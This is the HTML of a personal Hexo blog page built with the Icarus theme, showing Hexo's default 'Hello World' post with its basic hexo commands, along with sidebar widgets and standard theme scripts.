<p><a href="/archives/%20%7C%7C%20archive"> 33 日志 </a></p>
<p>(C) 2022 __ Dan Kuroto</p>
<p>由 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动</p>
<p>|</p>
<p>主题 – <a target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</p>
<p>__</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T05:32:35.452Z" title="2022/5/2 13:32:35">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T05:32:35.452Z" title="2022/5/2 13:32:35">2022-05-02</time></span><span class="level-item">a minute read (About 123 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/02/hello-world/">Hello World</a></h1><div class="content"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">Previous</a></div><div class="pagination-next is-invisible is-hidden-mobile"><a href="/page/3/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="SpadeAce"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">SpadeAce</p><p class="is-size-6 is-block">kamen rider</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">15</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/SpadeHeart/SpadeHeart.github.io" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/SpadeHeart/SpadeHeart.github.io"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.917Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/14/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.916Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/13/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.914Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/12/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.912Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/11/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-02T06:11:47.911Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/10/"> </a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2022 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>